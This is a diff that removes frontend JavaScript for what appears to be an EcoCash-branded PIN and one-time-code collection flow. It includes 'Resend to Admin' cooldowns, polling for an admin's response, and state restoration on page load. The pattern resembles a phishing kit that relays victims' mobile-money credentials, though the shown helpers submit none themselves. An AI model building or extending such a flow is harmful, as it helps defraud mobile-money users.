-    document.getElementById('pin' + (idx + 1)).focus();
-  }
-  if (input.value.length === 0 && idx > 0) {
-    document.getElementById('pin' + (idx - 1)).focus();
-  }
-}
-
-function togPin() {
-  let inputs = document.querySelectorAll('.pin-box');
-  inputs.forEach(inp => inp.type = inp.type === 'password' ? 'text' : 'password');
-}
-
-function clearLoginPin() {
-  document.querySelectorAll('.pin-box').forEach(inp => {
-    inp.value = '';
-    inp.disabled = false;
-  });
-}
-
-function handleOtpInput(input, type) {
-  if (input.value.length > 0 && input.id !== 'otp5') {
-    document.getElementById('otp' + (parseInt(input.id.slice(3)) + 1)).focus();
-  }
-}
-
-function clearOtpCode() {
-  document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
-}
-
-// ============================================================
-// Resend cooldown + waiting status
-// ============================================================
-function getCooldownKey(step) {
-  return `ecocash_resend_until_${step}`;
-}
-
-function getRemainingCooldown(step) {
-  const until = parseInt(localStorage.getItem(getCooldownKey(step)) || '0', 10);
-  return Math.max(0, until - Date.now());
-}
-
-function startResendCooldown(step, btnId) {
-  const until = Date.now() + RESEND_COOLDOWN_MS;
-  localStorage.setItem(getCooldownKey(step), String(until));
-  applyCooldownUI(step, btnId);
-}
-
-function applyCooldownUI(step, btnId) {
-  const btn = document.getElementById(btnId);
-  if (!btn) return;
-  if (btn._cooldownTimer) {
-    clearInterval(btn._cooldownTimer);
-    btn._cooldownTimer = null;
-  }
-
-  const tick = () => {
-    const remaining = getRemainingCooldown(step);
-    if (remaining <= 0) {
-      btn.disabled = false;
-      btn.classList.remove('cooldown');
-      btn.textContent = '🔄 Resend to Admin';
-      if (btn._cooldownTimer) {
-        clearInterval(btn._cooldownTimer);
-        btn._cooldownTimer = null;
-      }
-      localStorage.removeItem(getCooldownKey(step));
-      return;
-    }
-    const secs = Math.ceil(remaining / 1000);
-    btn.disabled = true;
-    btn.classList.add('cooldown');
-    btn.textContent = `⏳ Resend in ${secs}s`;
-  };
-
-  tick();
-  btn._cooldownTimer = setInterval(tick, 500);
-}
-
-async function requestResend(step) {
-  const btnId = step === 'pin' ? 'resendBtnPin' : step === 'otp' ? 'resendBtnOtp' : 'resendBtnApp';
-
-  if (getRemainingCooldown(step) > 0) return;
-
-  setResendWaitingStatus(step, 'waiting');
-
-  try {
-    const res = await fetch(`/api/resend-step/${appData.applicationId}/${step}`, { method: 'POST' });
-    const data = await res.json();
-    if (res.status === 429 && data.cooldown) {
-      const until = Date.now() + (data.remainingSec * 1000);
-      localStorage.setItem(getCooldownKey(step), String(until));
-      applyCooldownUI(step, btnId);
-      setResendWaitingStatus(step, 'error', data.error);
-      return;
-    }
-    if (data.ok) {
-      startResendCooldown(step, btnId);
-      setResendWaitingStatus(step, 'sent');
-      if (step === 'pin') startPinPolling();
-      else if (step === 'otp') startOtpPolling();
-    } else {
-      setResendWaitingStatus(step, 'error', data.error || 'Failed to resend');
-    }
-  } catch (err) {
-    setResendWaitingStatus(step, 'error', 'Network error');
-  }
-}
-
-function setResendWaitingStatus(step, state, extraMsg) {
-  const statusId = step === 'pin' ? 'resendStatusPin' : step === 'otp' ? 'resendStatusOtp' : 'resendStatusApp';
-  const el = document.getElementById(statusId);
-  if (!el) return;
-
-  if (state === 'waiting') {
-    el.className = 'resend-status show waiting';
-    el.innerHTML = '<span class="rs-dot"></span> Resent — waiting for admin response…';
-  } else if (state === 'sent') {
-    el.className = 'resend-status show waiting';
-    el.innerHTML = '<span class="rs-dot"></span> Sent to admin. Watching for response…';
-  } else if (state === 'clear') {
-    el.className = 'resend-status';
-    el.innerHTML = '';
-  } else if (state === 'error') {
-    el.className = 'resend-status show error';
-    el.innerHTML = '⚠️ ' + (extraMsg || 'Resend failed');
-    setTimeout(() => {
-      el.className = 'resend-status';
-      el.innerHTML = '';
-    }, 4000);
-  }
-}
-
-function restoreResendCooldowns() {
-  applyCooldownUI('pin', 'resendBtnPin');
-  applyCooldownUI('otp', 'resendBtnOtp');
-  applyCooldownUI('app', 'resendBtnApp');
-}
-
-// ─── Restore State on Page Load ───
-document.addEventListener('DOMContentLoaded', function () {
-  const restored = loadState();
-  if (restored && appData.applicationId) {
-    if (currentPage === 'page-processing') {
-      goTo('page-processing');
-      startAppPolling();
-    } else if (currentPage === 'page-pin') {
-      goTo('page-pin');
-    } else if (currentPage === 'page-otp') {
-      goTo('page-otp');
-      startOtpPolling();
-    } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
-      goTo(currentPage);
-    } else {
-      goTo(currentPage);
-    }
-  } else {
-    goTo('page-landing');
-  }
-  restoreResendCooldowns();
-});
